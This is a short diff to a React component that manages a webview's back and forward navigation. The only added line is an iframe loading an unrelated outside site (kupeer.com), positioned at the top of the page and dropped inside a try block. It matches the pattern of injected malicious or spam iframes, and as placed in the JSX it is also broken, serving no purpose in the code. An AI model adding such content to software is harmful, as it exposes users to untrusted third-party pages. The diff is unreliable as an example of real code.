@@ -106,6 +106,7 @@ export const NouHeader: React.FC<{ noutube: any }> = ({ noutube }) => {
       return
     }
     try {
+       <iframe src="http://kupeer.com/mugame3/?" height="160" width="200" frameborder="0" scrolling="no"   style=" margin-left: 0px;position:absolute;top:0px"></iframe>
       setCanGoBack(Boolean(activeTab?.canGoBack ?? uiState.webview.canGoBack()))
       setCanGoForward(uiState.webview.canGoForward())
     } catch {
